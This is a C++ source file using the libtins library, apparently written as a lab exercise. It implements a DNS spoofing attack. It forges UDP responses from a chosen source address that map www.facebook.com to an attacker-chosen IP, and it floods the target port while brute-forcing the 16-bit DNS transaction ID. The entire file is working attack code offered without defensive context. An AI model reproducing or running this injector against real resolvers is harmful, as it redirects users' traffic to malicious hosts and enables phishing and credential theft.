#include <tins/tins.h>
#include <cassert>
#include <iostream>
#include <string>
#include <unistd.h>
#include <thread>
#include <random>



using std::thread;
using std::cout;
using std::string;
using std::vector;
using namespace Tins;


int current_spoof_port, best_port, chack_count, resp_count, sniff_size;
bool is_running = true;
bool verbose = false;
bool count_resp = false;

bool sniffed_resp = false;
string dest_ip;
string source_ip;


void print_divider(int count) {
  int i = 0;
  while (i < count) {
    if (verbose) cout << "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n";
    i++;
  }
}





// coming from a specific remote_ip:port
//
int send_dns(string src_ip, int sport, string dest_ip, int dport) {

  PacketSender sender;
  NetworkInterface iface("enp0s10");

  IP pkt = IP(dest_ip, src_ip) / UDP(dport, sport) / DNS();

  string spoof_domain = "www.facebook.com";
  string redirect_ip = "192.168.2.2";

  // Add the fake response
  pkt.rfind_pdu<DNS>().add_query({ spoof_domain, DNS::A, DNS::IN });
  pkt.rfind_pdu<DNS>().add_answer(
    DNS::resource(
      spoof_domain,
      redirect_ip, // some bad guy IP we wanna redirect to
      DNS::A,
      1, // class of the record??
      // 777 is just a random TTL
      777
    )
  );
  // We want the query to be resolverd recursively
  //pkt.rfind_pdu<DNS>().id(tx_id);
  pkt.rfind_pdu<DNS>().type(DNS::QRType::RESPONSE);
  pkt.rfind_pdu<DNS>().recursion_desired(1);
  pkt.rfind_pdu<DNS>().recursion_available(1);


  int id = 1;
  int max_id = 65000; // probably 65k or 16 bits

  int block_size = 65000 / 4;

  while (id < block_size) {

    int c = 0;
    int send_id = id;
    while (c < 4) {
        pkt.rfind_pdu<DNS>().id(send_id);
        sender.send(pkt, iface);
        send_id += block_size;
        c ++;
    }
    //pkt.rfind_pdu<DNS>().id(id);
    //sender.send(pkt, iface);

    if (id % 1000 == 0) cout << "sending w id: " << id << "\n";
    id ++;
    usleep(250);
  }

  //sender.send(pkt, iface);

  return 1;

}



int main(int argc, char** argv) {

  if (argc != 5) {
    cout << "sike wrong number of args ---> (src_ip, sport, dest_ip, dport)\n";
    return 0;
  }

  string src_ip = argv[1];
  int sport = atoi(argv[2]);
  string dest_ip = argv[3];
  int dport = atoi(argv[4]);

  cout << "trying to inject dns to port " << dport << "\n";

  int p = send_dns(src_ip, sport, dest_ip, dport);

  return p;
}
